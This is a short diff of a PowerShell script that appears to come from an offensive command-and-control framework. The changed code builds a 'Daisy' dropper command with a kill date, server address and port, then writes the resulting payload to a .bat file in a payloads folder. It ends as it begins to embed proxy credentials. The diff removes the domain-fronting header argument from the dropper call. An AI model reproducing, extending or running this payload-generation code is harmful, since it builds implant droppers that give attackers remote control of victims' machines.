@@ -726,7 +726,7 @@ param(
 [Parameter(Mandatory=$true)][AllowEmptyString()][string]$proxyuser, 
 [Parameter(Mandatory=$true)][AllowEmptyString()][string]$proxypassword)
 
-$command = createdropper -Daisy 1 -killdate $killdatefm -domainfrontheader $domfront -ipv4address $daisyserver -serverport $port 
+$command = createdropper -Daisy 1 -killdate $killdatefm -ipv4address $daisyserver -serverport $port 
 $payload = createrawpayload -command $command
 
 # create proxy payloads
@@ -737,7 +737,6 @@ CreateDLL -DaisyName $name
 
 [IO.File]::WriteAllLines("$FolderPath\payloads\$($name).bat", $payload)
 Write-Host -Object "Payload written to: $FolderPath\payloads\$($name).bat"  -ForegroundColor Green
-
 
 $fdsf = @"
 `$username = "$proxyuser"
